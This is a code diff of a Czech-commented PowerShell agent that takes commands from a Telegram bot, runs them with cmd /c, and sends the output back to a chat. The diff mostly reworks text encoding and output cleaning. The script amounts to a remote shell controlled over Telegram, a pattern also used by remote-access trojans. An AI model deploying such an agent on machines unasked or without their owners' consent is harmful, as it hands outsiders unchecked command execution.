@@ -11,7 +11,6 @@ function Write-Log($msg) {
 
 Write-Log "=== AGENT START ==="
 
-# Načti uložený stav (pokud existuje)
 if(Test-Path $stateFile) {
     try {
         $savedState = Get-Content $stateFile -Raw -Encoding UTF8 | ConvertFrom-Json
@@ -52,24 +51,30 @@ function Save-State {
     }
 }
 
+function Clean-Text($text) {
+    # Odstranit všechny non-ASCII znaky a nahradit je bezpečnými alternativami
+    $text = $text -replace '[^\x00-\x7F]','?'
+    return $text
+}
+
 function Send-Message($text) {
     if(!$chatId){
-        Write-Log "ERROR: chatId neni nastaveno, nelze odeslat: $text"
+        Write-Log "ERROR: chatId neni nastaveno"
         return
     }
     
     Write-Log "Odesilam zpravu do chatId=$chatId"
     
-    # Ujisti se že je text v UTF-8 a escape JSON znaky
-    $text = $text -replace '\\','\\' -replace '"','\"' -replace "`n",'\n' -replace "`r",'' -replace "`t",'\t'
+    # Vyčisti text od problematických znaků
+    $text = Clean-Text $text
     
-    # Odstranit problematické non-UTF-8 znaky
-    $text = [System.Text.Encoding]::UTF8.GetString([System.Text.Encoding]::UTF8.GetBytes($text))
+    # Escape JSON znaky
+    $text = $text -replace '\\','\\' -replace '"','\"' -replace "`n",'\n' -replace "`r",''
     
     $json = "{`"chat_id`":`"$chatId`",`"text`":`"$text`"}"
     
     try {
-        $result = Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -ContentType 'application/json; charset=utf-8' -Body ([System.Text.Encoding]::UTF8.GetBytes($json)) -ErrorAction Stop
+        Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -ContentType 'application/json; charset=utf-8' -Body ([System.Text.Encoding]::UTF8.GetBytes($json)) -ErrorAction Stop | Out-Null
         Write-Log "Zprava odeslana OK"
     } catch {
         Write-Log "ERROR pri odesilani zpravy: $_"
@@ -147,13 +152,25 @@ while($true) {
                 Write-Log "Vykonavani prikazu: $cmd"
                 Send-Message "[EXECUTING] $cmd"
                 try {
-                    # Nastav CMD na UTF-8 kódování před spuštěním příkazu
-                    $output = cmd /c "chcp 65001 >nul 2>&1 & $cmd" 2>&1
+                    # Ulož výstup do dočasného souboru s UTF-8
+                    $tempFile = [System.IO.Path]::GetTempFileName()
+                    
+                    # Spusť příkaz a ulož do souboru
+                    cmd /c "$cmd > `"$tempFile`" 2>&1"
                     $exitCode = $LASTEXITCODE
+                    
                     Write-Log "Prikaz dokoncen s exit code: $exitCode"
                     
-                    # Konvertuj do UTF-8 a odstranit BOM
-                    $output = $output | Out-String
+                    # Načti soubor jako UTF-8 a vyčisti znaky
+                    if(Test-Path $tempFile) {
+                        $output = Get-Content $tempFile -Raw -Encoding Default
+                        Remove-Item $tempFile -Force
+                    } else {
+                        $output = ""
+                    }
+                    
+                    # Vyčisti output
+                    $output = Clean-Text $output
                     $output = $output.Trim()
                     
                     if($output) {
